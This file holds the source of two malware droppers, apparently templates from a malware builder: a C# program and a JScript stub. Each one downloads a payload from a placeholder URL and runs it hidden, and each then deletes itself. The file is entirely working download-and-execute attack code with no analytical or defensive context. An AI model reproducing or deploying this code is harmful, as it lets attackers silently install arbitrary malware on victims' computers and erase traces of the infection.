using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Diagnostics;

namespace Dropper
{
    class Program
    {
        public static void Main()
        {
            // Download payload
            string tmp = Path.Combine(Path.GetTempPath(), "{PAYLOAD_NAME}");
            try
            {
                using (var wc = new WebClient())
                {
                    wc.DownloadFile("{PAYLOAD_URL}", tmp);
                }
            } catch { }
            // Run payload
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = "/C " + tmp,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = true,
            });
            // Self destruct
            string AssemblyPath = Assembly.GetExecutingAssembly().Location;
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = "/C chcp 65001 && ping 127.0.0.1 && DEL /F /S /Q /A \"" + AssemblyPath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = true,
            });
            Environment.Exit(0);
        }
    }
}

var pOut = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\\{0}";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', "{1}", false);
Object.Send();
var Stream = WScript.CreateObject('ADODB.Stream');
Stream.Open();
Stream.Type = 1;
Stream.Write(Object.ResponseBody);
Stream.Position = 0;
Stream.SaveToFile(pOut, 2);
Stream.Close();
new ActiveXObject("Shell.Application").ShellExecute(pOut,"","","open","1");
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);
